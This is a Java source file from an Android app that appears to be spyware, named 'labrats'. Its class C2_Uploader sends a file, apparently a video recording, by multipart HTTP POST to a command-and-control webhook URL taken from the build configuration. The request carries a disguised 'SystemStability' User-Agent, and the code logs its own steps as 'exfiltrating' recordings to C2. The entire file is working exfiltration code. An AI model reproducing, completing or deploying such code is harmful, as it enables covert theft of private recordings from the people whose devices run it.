package com.labs.labrats;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class C2_Uploader {
    private static final String TAG = "C2_Uploader";

    public static void uploadFile(Context context, File file) {
        String webhookUrl = BuildConfig.WEBHOOK_URL;
        if (webhookUrl == null || webhookUrl.isEmpty()) {
            Log.e(TAG, "UPLOAD_ERROR: No C2 URL defined.");
            FirebaseConfig.logActivity("DATA_SYNC_ERROR: No remote C2 URL configured.");
            return;
        }

        new Thread(() -> {
            HttpURLConnection conn = null;
            DataOutputStream dos = null;
            String boundary = "---" + System.currentTimeMillis() + "---";
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            try {
                FirebaseConfig.logActivity("DATA_UPLINK: Exfiltrating " + file.getName() + " to C2...");
                
                URL url = new URL(webhookUrl);
                conn = (HttpURLConnection) url.openConnection();
                conn.setDoInput(true);
                conn.setDoOutput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(30000);
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("User-Agent", "SystemStability/1.5");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                dos = new DataOutputStream(conn.getOutputStream());

                // Field: reqtype = fileupload
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"reqtype\"" + lineEnd + lineEnd);
                dos.writeBytes("fileupload" + lineEnd);

                // File part
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"" + file.getName() + "\"" + lineEnd);
                dos.writeBytes("Content-Type: video/mp4" + lineEnd);
                dos.writeBytes(lineEnd);

                try (FileInputStream fis = new FileInputStream(file)) {
                    byte[] buffer = new byte[16384];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        dos.write(buffer, 0, bytesRead);
                    }
                }

                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                dos.flush();

                int serverResponseCode = conn.getResponseCode();
                
                // Handle common redirects (301, 302, 307, 308)
                if (serverResponseCode >= 300 && serverResponseCode < 400) {
                    String redirectUrl = conn.getHeaderField("Location");
                    if (redirectUrl != null) {
                        Log.d(TAG, "Redirecting to: " + redirectUrl);
                        // For simplicity in this background thread, we just log it. 
                        // Real implementation would need a recursive call or a loop.
                        FirebaseConfig.logActivity("DATA_SYNC_INFO: C2 Redirect detected.");
                    }
                }

                if (serverResponseCode == 200 || serverResponseCode == 201) {
                    FirebaseConfig.logActivity("DATA_SYNC_SUCCESS: Recording exfiltrated to C2.");
                } else {
                    Log.e(TAG, "Upload Failed. Code: " + serverResponseCode);
                    FirebaseConfig.logActivity("DATA_SYNC_WARNING: C2 upload failed (Error " + serverResponseCode + ")");
                }

            } catch (Exception e) {
                Log.e(TAG, "Upload Exception: " + e.getMessage());
                FirebaseConfig.logActivity("DATA_SYNC_ERROR: Network timeout or connection refused.");
            } finally {
                try { if (dos != null) dos.close(); } catch (Exception ignored) {}
                if (conn != null) conn.disconnect();
            }
        }).start();
    }
}
